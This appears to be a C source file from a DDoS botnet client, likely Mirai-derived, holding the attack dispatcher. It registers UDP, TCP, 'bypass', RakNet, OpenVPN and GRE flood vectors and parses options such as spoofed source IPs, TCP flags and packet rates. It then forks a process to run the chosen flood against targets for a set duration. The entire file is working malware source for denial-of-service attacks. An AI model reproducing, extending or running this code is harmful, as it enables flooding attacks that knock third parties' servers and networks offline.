#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "../../utils/headers/includes.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "attack.h"
#include "../debug.h"

uint8_t floods_len = 0;
struct flood_info **floods = NULL;

int floods_init()
{
    // udp floods
    add_flood(FLOOD_UDPPLAIN, (FLOOD_FUNC)flood_udpplain);
    add_flood(FLOOD_UDPRAW, (FLOOD_FUNC)flood_udpraw);
    add_flood(FLOOD_STD, (FLOOD_FUNC)flood_std);
    add_flood(FLOOD_UDPBYPASS, (FLOOD_FUNC)flood_udpbypass);
    add_flood(FLOOD_OPENVPN, (FLOOD_FUNC)flood_udp_openvpn);
    add_flood(FLOOD_RAKNET, (FLOOD_FUNC)flood_raknet);

    // tcp floods
    add_flood(FLOOD_ACK, (FLOOD_FUNC)flood_ack);
    add_flood(FLOOD_SYNDATA, (FLOOD_FUNC)flood_syndata);
    add_flood(FLOOD_STOMP, (FLOOD_FUNC)flood_stomp);
    
    // bypass floods
    add_flood(FLOOD_TCPBYPASS, (FLOOD_FUNC)flood_tcpbypass);
    add_flood(FLOOD_HANDSHAKE, (FLOOD_FUNC)flood_handshake);
    add_flood(FLOOD_SOCKET, (FLOOD_FUNC)flood_socket);
    add_flood(FLOOD_SOCKETHOLD, (FLOOD_FUNC)flood_sockethold);
    add_flood(FLOOD_WRA, (FLOOD_FUNC)flood_wra);

    // layer3 floods
    add_flood(FLOOD_GREIP, (FLOOD_FUNC)flood_greip);
    return TRUE;
}

void add_flood(uint8_t vector, FLOOD_FUNC func)
{
    struct flood_info *method = calloc(1, sizeof(struct flood_info));

    method->id = vector;
    method->func = func;

    floods = realloc(floods, (floods_len + 1) * sizeof(struct flood *));
    floods[floods_len++] = method;
}

FLOOD_FUNC retrieve_flood(int id)
{
    int i = 0;

    for (i = 0; i < floods_len; i++)
    {
        if (floods[i]->id == id)
        {
            return floods[i]->func;
        }
    }

    return NULL;
}

void flood_start(uint8_t id, struct flood_flag *opt, uint8_t num_of_options, struct flood_target *target, uint8_t num_of_targets, uint16_t duration)
{
    int flooder, terminator;

    struct flood flood;
    struct flood_settings settings;

    flood.targets = target;
    flood.num_of_targets = num_of_targets;
    flood.num_of_options = num_of_options;
    flood.options = opt;
    flood.duration = duration;

    FLOOD_FUNC command = retrieve_flood(id);
    if (command == NULL)
    {
        debug("Flood with ID '%d' does not exist\n", id);
        return;
    }

    settings.dest_port = get_option_number(num_of_options, opt, OPT_DPORT, 0xffff);
    settings.tcp_dest_port = get_option_number(num_of_options, opt, OPT_TCP_DEST_PORT, 80);
    settings.source_port = get_option_number(num_of_options, opt, OPT_SPORT, 0xffff);
    settings.raknet_protocol = get_option_number(num_of_options, opt, OPT_RAKNET_PROTOCOL, 10);

    settings.length = get_option_number(num_of_options, opt, OPT_PAYLOAD_SIZE, 512);

    settings.min_length = get_option_number(num_of_options, opt, OPT_MIN_LEN, 0);
    settings.max_length = get_option_number(num_of_options, opt, OPT_MAX_LEN, 0);

    settings.random_data = get_option_number(num_of_options, opt, OPT_PAYLOAD_RAND, 1);

    settings.syn = get_option_number(num_of_options, opt, OPT_SYN, 0);
    settings.ack = get_option_number(num_of_options, opt, OPT_ACK, 0);
    settings.urg = get_option_number(num_of_options, opt, OPT_URG, 0);
    settings.psh = get_option_number(num_of_options, opt, OPT_PSH, 0);
    settings.rst = get_option_number(num_of_options, opt, OPT_RST, 0);
    settings.fin = get_option_number(num_of_options, opt, OPT_FIN, 0);

    settings.seq_rnd = get_option_number(num_of_options, opt, OPT_SEQRND, 0xffff);
    settings.ack_seq_rnd = get_option_number(num_of_options, opt, OPT_ACKRND, 0xffff);

    settings.tos = get_option_number(num_of_options, opt, OPT_IP_TOS, 0);
    settings.ttl = get_option_number(num_of_options, opt, OPT_IP_TTL, 64);
    settings.ident = get_option_number(num_of_options, opt, OPT_IP_IDENT, 0xffff);
    settings.dont_fragment = get_option_number(num_of_options, opt, OPT_IP_DF, 0);

    settings.repeat = get_option_number(num_of_options, opt, OPT_REPEAT, 1);
    settings.sleep = get_option_number(num_of_options, opt, OPT_SLEEP, 0);
    settings.csleep = get_option_number(num_of_options, opt, OPT_CSLEEP, 0);
    settings.min_pps = get_option_number(num_of_options, opt, OPT_MINPPS, 0);
    settings.max_pps = get_option_number(num_of_options, opt, OPT_MAXPPS, 0);

    settings.const_ip = get_option_number(num_of_options, opt, OPT_GRE_CONSTIP, 0);
    settings.source_ip = get_option_ip(num_of_options, opt, OPT_SOURCE, LOCAL_ADDR);

    settings.payload = get_option_hex_string(num_of_options, opt, OPT_PAYLOAD, NULL);

    if (settings.payload != NULL)
    {
        settings.random_data = 0;
        settings.length = _strlen(settings.payload);
        debug("Flood has an custom payload! Data randomization has been turned off\r\n");
    }

    int x = 0;
    for (x = 0; x < flood.num_of_targets; x++)
    {
        struct flood_target target = flood.targets[x];
        target.sock_addr.sin_port = settings.dest_port;
    }

    flood.settings = &settings;

    debug("Flood with ID '%d' has been started\n", id);

    flooder = fork();
    if (flooder == -1 || flooder != 0)
        return;

    terminator = fork();
    if (terminator == -1)
        exit(1);

    if (terminator == 0)
        flood_kill(&flood);

    // Call the command function here in the child
    command(&flood);
}

void flood_kill(struct flood *flood)
{
    int parentpid = -1;
    int i = 0;

    debug("Sleeping %d seconds before killing the flood\n", flood->duration);

    sleep(flood->duration);

    parentpid = getppid();

    if (parentpid > 1)
    {
        kill(parentpid, SIGKILL);
        debug("Killed the flood pid %d after %d seconds\n", parentpid, flood->duration);
    }

    if (flood->targets)
        free(flood->targets);

    if (!flood->options)
        exit(0);

    free(flood->options);

    exit(0);
}
